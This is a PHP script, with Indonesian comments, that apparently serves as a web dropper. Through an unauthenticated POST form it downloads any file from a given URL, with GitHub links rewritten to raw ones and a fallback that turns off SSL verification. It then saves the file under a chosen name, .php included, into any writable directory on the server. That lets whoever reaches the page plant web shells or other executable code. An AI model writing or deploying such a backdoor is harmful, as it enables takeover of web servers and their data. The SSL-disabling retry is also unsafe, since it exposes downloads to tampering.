        <?php
        // ==============================
        // Fungsi universal download URL
        // ==============================
        function normalize_github_raw_url(string $url): string {
            $u = parse_url($url);
            if (!isset($u['host']) || stripos($u['host'], 'github.com') === false) return $url;

            $path = trim($u['path'] ?? '', '/');
            $parts = explode('/', $path);
            if (count($parts) < 4) return $url;

            $owner = $parts[0] ?? '';
            $repo  = $parts[1] ?? '';
            $mode  = $parts[2] ?? '';

            if ($mode !== 'raw' && $mode !== 'blob') return $url;

            if (($parts[3] ?? '') === 'refs' && ($parts[4] ?? '') === 'heads' && isset($parts[5])) {
                $branch = $parts[5];
                $filePath = implode('/', array_slice($parts, 6));
            } else {
                $branch = $parts[3] ?? 'main';
                $filePath = implode('/', array_slice($parts, 4));
            }

            return "https://raw.githubusercontent.com/{$owner}/{$repo}/{$branch}/{$filePath}";
        }

        function getRemoteFile(string $url) {
            $url = normalize_github_raw_url($url);

            if (function_exists('curl_version')) {
                $ch = curl_init($url);
                curl_setopt_array($ch, [
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_FOLLOWLOCATION => true,
                    CURLOPT_MAXREDIRS      => 10,
                    CURLOPT_CONNECTTIMEOUT => 10,
                    CURLOPT_TIMEOUT        => 30,
                    CURLOPT_SSL_VERIFYPEER => true,
                    CURLOPT_USERAGENT      => 'Mozilla/5.0 (Compatible; PHP cURL Universal Downloader)',
                    CURLOPT_HTTPHEADER     => ['Accept: */*'],
                ]);
                $data = curl_exec($ch);
                $http = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
                $errno = curl_errno($ch);

                // Retry tanpa verifikasi SSL jika gagal
                if (($data === false || $http >= 400) && ($errno === 60 || $errno === 77)) {
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    $data = curl_exec($ch);
                    $http = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
                }

                curl_close($ch);
                if ($data !== false && $http >= 200 && $http < 400 && strlen($data) > 0) return $data;
                return false;
            }

            // Fallback: file_get_contents
            if (ini_get('allow_url_fopen')) {
                $context = stream_context_create([
                    'http' => [
                        'method' => 'GET',
                        'header' => "User-Agent: Mozilla/5.0\r\nAccept: */*\r\n",
                        'timeout' => 30,
                        'ignore_errors' => true,
                    ],
                    'ssl' => [
                        'verify_peer' => true,
                        'verify_peer_name' => true,
                    ],
                ]);
                $data = @file_get_contents($url, false, $context);
                return ($data !== false && strlen($data) > 0) ? $data : false;
            }
            return false;
        }

        function is_safe_filename(string $name): bool {
            return (bool)preg_match('/^[A-Za-z0-9._-]{1,255}$/', $name);
        }

        // =============================
        // Proses Upload
        // =============================
        $output = "";
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $url = trim($_POST['url'] ?? '');
            $filename = trim($_POST['filename'] ?? '');
            $path = rtrim(trim($_POST['path'] ?? ''), '/');

            if (!filter_var($url, FILTER_VALIDATE_URL)) {
                $output = "<p style='color:red;'>URL tidak valid.</p>";
            } elseif (!is_safe_filename($filename)) {
                $output = "<p style='color:red;'>Nama file tidak aman. Gunakan huruf/angka/titik/underscore/dash.</p>";
            } elseif (!is_dir($path) || !is_writable($path)) {
                $output = "<p style='color:red;'>Direktori tidak ditemukan atau tidak bisa ditulis: " . htmlspecialchars($path, ENT_QUOTES, 'UTF-8') . "</p>";
            } else {
                $file_contents = getRemoteFile($url);
                if ($file_contents === false) {
                    $output = "<p style='color:red;'>Gagal mengambil data dari URL yang diberikan.</p>";
                } else {
                    $file_path = $path . '/' . $filename;
                    if (file_put_contents($file_path, $file_contents) !== false) {
                        $output = "<p style='color:green;'>File berhasil diunggah: <b>" . htmlspecialchars(basename($file_path), ENT_QUOTES, 'UTF-8') . "</b></p>";
                    } else {
                        $output = "<p style='color:red;'>Gagal menyimpan file ke: " . htmlspecialchars($file_path, ENT_QUOTES, 'UTF-8') . "</p>";
                    }
                }
            }
        }
        echo $output;
